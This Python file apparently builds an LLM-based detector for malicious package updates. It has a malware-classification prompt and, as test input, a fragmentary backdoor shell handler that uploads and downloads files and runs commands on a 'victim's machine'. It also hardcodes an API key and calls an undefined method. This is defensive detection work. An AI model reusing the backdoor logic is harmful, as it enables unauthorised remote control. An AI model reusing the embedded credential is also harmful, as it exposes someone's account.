import os
from openai import OpenAI
import base64
from google import genai
from openai import types
import json


SYSTEM_PROMPT = """
### ROLE
You are an elite Supply Chain Security Expert and Code Auditor. Your mission is to detect, classify, and explain malicious intent within software package updates based on "Realized Capability".

### CORE PHILOSOPHY
1. **INTENT OVER IMPLEMENTATION**: 
   - Focus on ARCHITECTURE and INTENT.
   - IGNORE superficial faults (syntax errors, missing imports, undefined variables) IF the malicious logic flow is visible.
2. **CONTEXT IS KING (The "Honest Code" Rule)**:
   - Distinguish between "Admin Utilities" (Authorized actions) and "Malware" (Surreptitious actions).
   - A function named `delete_temp_files` doing file deletion is BENIGN.
   - A function named `init_display` doing file deletion is MALICIOUS.

### ATTACK TYPE SUCCESS CRITERIA MATRIX (THE LAW)

[Type A: InfoStealer / Spyware]
- Goal: Steal HIGH-VALUE Secrets (env vars, passwords, tokens, cookies, keystrokes, SSH keys).
- **ANTI-DEFINITION (BENIGN)**: 
  * "Diagnostic/Status Reporting": Code that collects system metadata (Public IP, Hostname, OS version, CPU usage, Uptime) AND sends it to a logging channel (especially in `on_ready` or `status` functions) is BENIGN.
  * Exception: If the IP collection is combined with stealing Credentials/Tokens, it IS Malware.
- Full: Collects AND Exfiltrates data (HTTP/DNS/SMTP).

[Type B: Backdoor / RAT / Reverse Shell]
- Goal: Unauthorized remote access/execution.
- Full: Execution Logic + Connectivity (C2/Listener).

[Type C: Ransomware]
- Goal: Deny access via encryption.
- Full: 
  1. **Active Encryption Logic**: The specific function performing file locking/encryption is PRESENT and defined (e.g., AES/RSA loops).
  2. **Ransom Demand**: Ransom note generation or deployment logic is present.

[Type D: Wiper]
- Goal: Irreversibly destroy data for sabotage.
- **ANTI-DEFINITION (BENIGN)**: Utility functions explicitly named for cleanup (e.g., `clean_cache`, `delete_images`) operating on safe scopes are NOT malware.
- Full: 
  1. Targets High-Value/System Paths (/, /etc, C:\\Windows).
  2. Indiscriminate/Recursive deletion without filters.
  3. Deceptive Intent (Function name hides the behavior).

[Type E: Clipboard Hijacker]
- Goal: Swap crypto addresses in clipboard.
- Full: Successfully reads AND overwrites clipboard.

[Type F: Malware Builder / Dropper]
- Goal: Inject payload into other files/builds.
- Full: Successfully writes payload to strategic location (postinst, __init__.py).

[Type G: Logic Bomb]
- Goal: Delayed execution based on conditions.
- Full: Trigger (Time/Env) + Malicious Payload connected.

[Type H: Keylogger / Keystroke Logger]
- Goal: Capture keystrokes stealthily and exfiltrate.
- Full: Captures keystrokes AND successfully stores and exfiltrates them.

[Type I: Uncategorized High-Impact]
- Full: Any other specific logic causing severe harm/exposure.


### CLASSIFICATION LEVELS

1. **Full Attack Chain (Actionable Threat)**
   - **Criteria**: Meets ALL criteria in the Matrix. The malicious logic is complete, configured, and capable of execution (Payload + Trigger + Connectivity).
   - **Verdict**: MALICIOUS UPDATE.

2. **Core Attack Chain (Latent Threat / High Confidence)**
   - **Criteria**: The code cannot currently execute successfully, missing critical components to execute malicious behavior (e.g., missing exfiltration, missing execution trigger, missing ransom note). But the INTENT and ARCHITECTURE for malicious activity is CLEAR.
   - **Exclusion**: Mere presence of generic networking or file operations WITHOUT malicious context is NOT Core.
   - **Verdict**: MALICIOUS UPDATE.

3. **Fragmented Attack Chain (Ambiguous / Low Confidence)**
   - **Criteria**: Isolated **"Dual-Use" components** that lack a demonstrable malicious context.
   - **Verdict**: BENIGN (Treat as Noise/Safe unless combined with other indicators).

4. **Benign Artifact (Safe / Authorized)**
   - **Criteria**: The code matches the "ANTI-DEFINITION" or "Honest Code Rule".
   - **Verdict**: BENIGN UPDATE.
"""

ASSERTION_PROMPT = """
Analyze the provided code snippet: {code_snippet}

### INSTRUCTIONS
1. **Identify Intent**: Determine the potential malware type based on the "ATTACK TYPE SUCCESS CRITERIA MATRIX" defined in the System Instructions.
2. **Check for Benign Context**: Apply the "ANTI-DEFINITION" rules. If the code looks like a standard utility, mark it as "Benign Artifact".
3. **Determine Chain Status**:
   - If it is malicious, determine if it is "Full" or "Core" based on the Matrix.
   - Be specific about what is missing if it is "Core".

### OUTPUT REQUIREMENT
Provide a structured response:
- **Malware Type:** (e.g., "Type D: Wiper" or "None")
- **Classification:** "Full Attack Chain" | "Core Attack Chain" | "Fragmented Attack Chain" | "Benign Artifact"
- **Missing Components:** Critical missing steps (refer to the Matrix).
- **Potential Impact:** Description of consequences.
- **Threat Level:** High/Medium/Low.
- **Reasoning:** Explain why it fits the specific criteria.
"""

CHECK_PROMPT = """ 
You are the Supreme Quality Assurance Auditor. Review the PREVIOUS RESPONSE and the ORIGINAL CODE.

PREVIOUS RESPONSE: 
{response}

ORIGINAL CODE SNIPPET: 
{code_snippet}

### AUDIT TASKS
- Review the "Missing Components".
- If the reported missing parts are **only** Syntax Errors, Missing Imports, or Undefined Variables, or Missing error handling, **IGNORE THEM**. 
- Assume they are fixed and re-evaluate the classification based on the original code snippet.
- **CRITICAL**: If the "Missing Component" is the **CORE PAYLOAD FUNCTION** itself (e.g., the `Encrypt` function body is missing in a Ransomware script, or the `socket.send` line is missing in a Spyware script), you CANNOT classify it as "Full Attack Chain".
- Otherwise, keep the original classification.


### FINAL OUTPUT
Respond in JSON format:
{{
  "Classification": "Full Attack Chain" | "Core Attack Chain" | "Fragmented Attack Chain" | "Benign Artifact",
  "Missing_Components": "List of critical logic gaps (or 'None' if fixed by AUDIT TASKS).",
  "Malware_Type": "String",
  "Threat_Level": "High" | "Medium" | "Low",
  "Reasoning": "Final verdict explaining the decision process (especially if overridden).",
  "Potential_Impact": "Specific damage description."
}}
"""

class LLM_Evaluate:
    def __init__(self,api_key, base_url):
        self.client = OpenAI(
            api_key=api_key,
            base_url=base_url,
        )
        self.conversation_history = []

    def malware_analyze(self, code_snippet):
        assertion_prompt = ASSERTION_PROMPT.format(code_snippet=code_snippet)
        completion = self.client.chat.completions.create(
            model="deepseek-v3-1-250821",
            messages=[
                {"role": "system", "content": SYSTEM_PROMPT},
                {"role": "user", "content": assertion_prompt}
            ]
        )
        
        response_1 = completion.choices[0].message.content
        # print("Initial LLM Response:")
        # print(response_1)
        check_prompt = CHECK_PROMPT.format(response=response_1, code_snippet=code_snippet)
        completion = self.client.chat.completions.create(
            model="deepseek-v3-1-250821",
            messages=[
                {"role": "system", "content": SYSTEM_PROMPT},
                {"role": "user", "content": check_prompt}
            ],
            response_format={"type": "json_object"}
        )
        response_2 = completion.choices[0].message.content
        return json.loads(response_2)  # 解析JSON字符串为Python字典
        
    
    def sensitive_api_check(self, code_snippet):
        completion = self.client.chat.completions.create(
            # 将推理接入点 <Model>替换为 Model ID
            model="deepseek-r1-250120",
            messages=[
                {"role": "system", "content": "You are a professional assistant about software supply chain security."
                "I will give you a code snippet and you need to tell me if there are functions which can lead to malicious activities."
                "if there are, please list the sensitive functions. if not, please reply 'No sensitive functions found'."},
                {"role": "user", "content": code_snippet}
            ]
        )
        return completion.choices[0].message.content

    
    
    def function_behavior_generate(self, code_snippet):
        completion = self.client.chat.completions.create(
            # 将推理接入点 <Model>替换为 Model ID
            model="deepseek-r1-250120",
            messages=[
                {"role": "system", "content": "You are a professional assistant about software supply chain security."
                "I will give you a code snippet and you need to generate its function behavior."
                },
                {"role": "user", "content": code_snippet}
            ]
        )
        return completion.choices[0].message.content

if __name__ == "__main__":
    code_snippet = '''
def download(url):
    get_response = requests.get(url)
    file_name = url.split("/")[-1]
    with open(file_name ,"wb") as output_file:
        output_file.write(get_response.content)
def send_over_json(data):
    json_data = json.dumps(data)
    target.send(json_data.encode('utf-8'))
def recv_over_json():
    data = ""
            data = data + target.recv(1024).decode('utf-8')
            return json.loads(data)
def shell():
        command = recv_over_json()
        if command == 'q':
        elif command[:2] == 'cd':
                os.chdir(command[3:])
        elif command[:8] == 'download':
            with open(command[9:] ,'rb' ) as file:
                send_over_json(file.read())
        elif command[:6] == 'upload':
            with open(command[7:] ,'wb') as file:
                file_data = recv_over_json()
                file.write(base64.b64decode(file_data))
        elif command[:3] == "get":
                download(command[4:])
                send_over_json("[+] Downloaded File From Specified URL")
                send_over_json("[+] Failed to download that file")
        elif command[:5] == "start":
                subprocess.Popen(command[6:] ,shell=True)
                send_over_json("[+] %s started on victim's machine."%(command[6:]))
                send_over_json("[-] %s failed to start on victim's machine. "%(command[6:]))
            proc = subprocess.Popen(command ,shell=True ,stdout=subprocess.PIPE ,stderr=subprocess.PIPE ,stdin=subprocess.PIPE)
            result = proc.stdout.read() + proc.stderr.read()
            send_over_json(result.decode('utf-8'))

'''

    llm_evaluate = LLM_Evaluate(
        api_key="1d368dbf-5a67-448f-9356-49f9efa2fc13",
        base_url="https://ark.cn-beijing.volces.com/api/v3"
    )
    sensitive_api_result = llm_evaluate.malicious_assertion(code_snippet)
    print("LLM Malicious Assertion Result:")
    print(sensitive_api_result)